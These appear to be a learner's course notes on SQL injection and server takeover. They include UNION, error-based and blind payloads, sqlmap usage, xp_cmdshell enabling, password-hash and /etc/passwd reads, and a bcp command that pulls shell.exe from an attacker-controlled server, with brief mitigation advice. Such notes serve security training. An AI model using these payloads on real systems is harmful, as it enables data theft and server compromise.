1. Introduction to SQL Injections
- web pages can connect to databases such as MySQL, SQL Server, Oracle, PostgreSQL and others.
- To interact with databases, entities such as systems operators, programmers, applications and web applications use the Structured Query Language (SQL).
- SQL is a powerful interpreted language used to extract and manipulate data from a database.
- If a table or query contains duplicate rows, you can use the DISTINCT operator to filter out duplicate entities:
	- `SELECT DISTINCT <field_list> <remainder of the statement> `
-  A UNION statement implies DISTINCT by default. You can prevent that by using the ALL operator
	-  `> <SELECT statement> UNION ALL <other SELECT statement>;`
- comments : # (the hash symbol) , -- (two dashes followed by a space) 


- In-band SQL injections : leverage the same channel used to inject the SQL code (i.e. the pages generated by the web application).
- Error-Based SQL injection attack : force the DMBS to output an error message
- blind SQL injection : does not reflect the results of the injection on the output.
***
2. Finding SQL Injections
	- SQL Error
		- Every DBMS responds to incorrect SQL queries with different error messages.
		- MS-SQL : Incorrect syntax near [query snippet]
		- MySQL : You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near [query snippet]
		- PostgreSQL : ERROR: each UNION query must have the same number of columns
		- Oracle : ORA-01789: query block has incorrect number of result columns
	- Security through obscurity : is the use of secrecy of design, implementation or configuration in order to provide security.
- Boolean based 
	- web application does not display errors on its output
	- So we can try to inject `999999' or '1'='1` to transform the query into: if Get result is Vulnarable
		- 1141' and 'els'='els
		- 1141' and 'els'='elsec
		- 1141' and 'hello'='hello
		- 1141' and 'hello'='bye 
		- els' or '1'='1
		- els' or '1'='2
		- els') or '1'='2
- Testing an input for SQL injection means trying to inject: 
	- String terminators: ' and "
	- SQL commands: SELECT, UNION and others
	- SQL comments: # or --
***
3. Exploiting In-Band SQL Injections
- In-band SQL injection "UNION-based" : techniques make the retrieval of data from the database very powerful thanks to the use of the `UNION` SQL command.
- `9999 UNION ALL SELECT Column_name FROM table_name WHERE user_id=1`
- use of the `ALL` operator. We used it to avoid the effect of an eventual `DISTINCT` clause in the original web application query.
- `9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1; -- -`

-  Identifying the number of fields
	- `9999 UNION SELECT NULL, NULL, NULL, NULL; -- -`
	- `order by`	
-	find their type
-  If the DBMS performs type enforcing on UNION statements you cannot perform a UNION between an integer and a string therefore, `SELECT 1 UNION 'a'`;
-  DBMS handles data types, we are required to provide an exact match of the data types for each column in the two SELECT statements.
	- MySQL No,MS SQL Server Yes, Oracle Yes, PostgreSQL Yes
-  Finding the data types
	1.  ' UNION SELECT null, null; -- -
	2.  ' UNION SELECT 1, null; -- - of Good Check second 
	3.  ' UNION SELECT 1, 1; -- - if error check string
	4.  ' UNION SELECT 1, 'a'; -- -


1. Identifying the number of fields
2. Find their type
3. Extract information about the database
***
4. Exploiting Error Based SQL Injections
- Schemas are databases with the singular purpose of describing all the other user-defined databases in the system.
-  ASP+MS SQL 
	- First piece of information we would like to know is the database version, payload :
	```
	9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
	```
	- `9999999` is just a bogus value (we want the OR part of the SQL query to be executed, so the first condition should be FALSE)
	- `or 1 in` trigger the error, asking the database to look for integer value 1 within a varchar column.
	- `CAST(<FIELDNAME> as varchar(4096))`  This is where we insert the column that we want to dump,`<FIELDNAME>` can also be a SQL function like user_name() or a variable like @@version.
	- `WHERE <FIELDNAME> NOT IN (<LIST>));` use this part in the iterations to dump database data.
	EX : `9999999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096)))--`

- Extract information from a database by using error-based SQL injections:
	- Current database username "privilege" : `CAST(user_name()`
	- Current database name : `CAST(db_name(0)) --> CAST(db_name(1..n))` We now have a list of installed databases
	- Installed databases : 
	- The tables into a given database : page 126
	- The columns of a given table : page 129
	- Database data  : page 131
	- Example 132 - 138 

MY Sql Error Based
- To exploit error-based SQL injection on MySQL, we will use the `group by` statement. This statement groups the result-set by one or more columns
- `group by` Remove Duplicated From db
- create your MySQL error-based injections :
	`select 1,2 union select count(*), concat(<information to extract>, floor(rand(0)*2)) as x from information_schema.tables group by x;`

PostgreSQL
- To exploit a SQLi on a web application using PostgreSQL, you have to leverage the cast technique we saw for MSSQL.
	`select cast(version() as numeric);`

5. Exploiting Blind SQL Injections
- If the web application is not exploitable via in-band or error-based SQL injections

- trigger an always true condition and see what happens. : `' OR 'a'='a`
- Once penetration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions, like:
	- Is the first letter of the username 'a'? : substring().
	- Does this database contain three tables? 
	- And so on

- `substring()` returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
	- `substring('elearnsecurity', 2, 1)` -output-> `l`
	- select substring(user(), 1, 1);
	- select substring(user(), 1, 1) = 'r';
	- ' or substr(user(), 1, 1)= 'a

- Test Blind SQLi
	1. Conditions
	2. Time based

1. Conditions
- To reduce the number of iterations you have to do per character. "discovered by SecForce"
	- The first test is to see if the conversion to upper case of the current character will yield a FALSE or TRUE condition:
			`ASCII(UPPER(SUBSTRING((MY Query),<position>, 1)))= ASCII(SUBSTRING((MY Query), <position>, 1))`
		- The ASCII() SQL function returns the ASCII code of a character
		- The UPPER() function transforms a character into uppercase.
		- Then we test if the conversion to lower case of the current character will yield a FALSE or TRUE condition:
		`ASCII(LOWER(SUBSTRING((<query>),<position>, 1)))= ASCII(SUBSTRING((<query>), <position>, 1))` 
- If the first query returns TRUE and the second is FALSE, the character is uppercase: We will iterate through [A-Z] only
- If the first query returns FALSE and the second is TRUE the character is lowercase: We will iterate through [a-z] only
- If both queries are TRUE our character is either a number or a symbol: We will iterate through [0-9] and symbols only
- Another Blind SQL Injection technique is called `Time-Based` Blind Sql injection.

2. Time Base
- Check if we are ‘sa’ (MS SQL Server)
	`if (select user) = 'sa' waitfor delay '0:0:5‘` 
- Guess a database value (MySQL) 
	`IF EXISTS (SELECT * FROM users WHERE username = ‘armando') BENCHMARK(10000000,MD5(1))`
***
6. SQLMap 
- sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
	- use a UNION based SQL injection technique.

	--banner : proof of the exploitability
	--users : users of the database
	--is-dba : is admin
	--dbs command lets you list all the available databases
- `sqlmap -u <target> -D <database> --tables <other options>`

SQLMap help you to fine
- The DBMS you are attacking
- Injection point
- Payload aggressiveness
- Exploitation speed and load on the client's infrastructure

The DBMSs you can specify are: 
- MySQL
- Oracle
- PostgreSQL
-  Microsoft SQL Server
-  Microsoft Access
-  SQLite
-  Firebird
-  Sybase
-  SAP MaxDB
-  DB2

- Append to --string a string which is always present in true output pages or `--string "nokia"` الحاجه لو البايلود ترو بتظهر
-  Append to --not-string a string which is always present in false output pages

Sometimes a SQLi payload is inserted in a structured POST parameter like a JSON or you need to insert some characters to make the query syntactically correct.
- `--prefix` and `--suffix`
- `$ sqlmap -u <URL> --suffix "'));" <other switches>`

To make SQLMap test:
- By default (Level 1) SQLMap tests GET and POST parameters,
- The Cookie header values 2
- The User-Agent and Referrer headers 3
- The Host header 5 
- You have to use the `--level` command line switch.


Risk
- `--risk`
	- 1 (Default) innocuous injections
	- 2 Enables heavy time-based injections
	- 3 Enables OR-based injections

reduced long time
- `--keep-alive`

Reduce the dumping phase time by using parallel threads.
- `--threads 1` --> 1 to 10 : Using 7 threads to exploit a blind injection

***
7. Mitigation Strategies
- input validation
	```
	if (!preg_match(|'^[a-z\s-]$|i', $name)) { die('Please enter a valid name'); }
	```
- Web applications, which use SQL, can separate the code from instructions using bind variables in SQL.
- mplementing prepared statements

8. From SQLi to Server Takeover
- Advanced features provided by MS SQL Server and MySQL, to get access to the DMBS server machine.
- providing advanced features to database administrators. Most of these features are privileged commands.
1.  our first testing : retrieve the sa user's password hash.
  1. `SELECT name, password FROM master..sysxlogins` : ms server 2000
  2. `SELECT name, password_hash FROM master.sys.sql_logins` : ms server >= 2005

2.  xp_cmdshell
- The sa user has complete control over the DBMS
- `EXEC master..xp_cmdshell '<command>'`
- xp_cmdshell is not enabled by default,it requires sa privileges, but, if the web application is connecting to the backend DB as the sa user, or we can somewhat connect as sa, we can enable it!
- To enable it we have to issue the following commands : 
	- EXEC sp_configure 'show advanced options', 1 ;
	- RECONFIGURE;
	- EXEC sp_configure 'xp_cmdshell', 1;
	- RECONFIGURE;
- And we can re-disable it after we are done with our tests:
	- EXEC sp_configure 'xp_cmdshell', 0;
	- EXEC sp_configure 'show advanced options', 0;
	- RECONFIGURE;
- Host enumeration
	- `EXEC master.dbo.xp_cmdshell 'ping <target IP address>'`
-  `OPENROWSET` is a SQL Server method you can use to access the tables of a remote server.
	```
	SELECT * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something;Network=DBMSSOCN;Address=<target IP>,<target port>;timeout=<connection timeout in seconds>', 'select 1')--
	```
	![[Pasted image 20220318080755.png]]
	
- read the file system
 `EXEC master..xp_cmdshell 'dir <target directory>'`
 `EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--`

- MSSQL upload a file
	- First, we have to insert the file into a table in a MS SQL database under our control
	`CREATE TABLE HelperTable (file text) BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')`
	- Then, we force the target DB server to retrieve it from our server : 
	 `EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our server address> -U<our server username> -P<our server password>'`
- Create temp table : page 151 - 158
- Advanced MySQl Exploitation
	- MySQL is another DBMS which provides some advanced features.
	- Expoit MySql to get full access to a target server.
	- The FILE privileges can be granted to any MySQL user
	- it is always granted to the MySQL root user both on *nix systems and MS Windows incarnations.
	- This means that if an application connects to its database as root, exploiting a SQL injection will lead not only to data compromise, but also to full server takeover
- read files
`SELECT LOAD_FILE('<text file path>');`
- read binary file
`SELECT HEX(LOAD_FILE('<text file path>'));`
- parse the content of a file and tell to MySQL how to distinguish a record from another one:
```
CREATE TABLE temptable(output longtext);
LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS
TERMINATED BY '\n' (output);
```

- Uploading File
	- Using  SELECT ... INTO DUMPFILE statement you can write to a file the result of a query `SELECT <fields> FROM <table> INTO DUMPFILE '<output file path>';`
	   This can be used to download huge query results via the web application and to upload penetration tester supplied data to the server
	- Example : 
		- To upload /bin/ls, you have to create a file on your local machine and then load it into a table: ![[Pasted image 20220409093135.png]]
		- Then you can test it by using INTO DUMPFILE to recreate the same file: ![[Pasted image 20220409093217.png]]
		- If everything works as expected you can upload the file content to a table on the victim server. You need to split the DUMPFILE you created into chunks of 1024 bytes and then insert them into a table field : ![[Pasted image 20220409093349.png]]
		- Finally, you can write the file on the target system by executing 
		`SELECT <victim field> FROM <victim table> WHERE <optinal conditions> INTO DUMPFILE '<output path>';`
	
	- Exec Shell Command
		- MySQL does not provide a function to run shell commands by default, but it provides User Defined Functions (UDF).
			- By using UDFs it is possible to create two functions:
				1. sys_eval(`command`) which returns the standard output of the chosen command
				2. sys_exec(`command`) that returns the command exit status
			- To use those functions, you have to upload a shared object (SO) on a *nix system or a dynamic-link library (DLL) on a Windows system to the target server.
			- After uploading the files to the target system, running a command is just a matter of performing a SELECT:
				- `SELECT sys_eval('command');`
				- `SELECT sys_exec('command');`

**This can be easily accomplished by using the SQLMap takeover features --os-cmd and --os-shell**

SQLMap
1. Test --user : Get username of db
2. --dbs : Get all data bases 
3. -D database_Name
4. --table
5. -T table_Name
6. --columns
7. -C column1,column2 dump
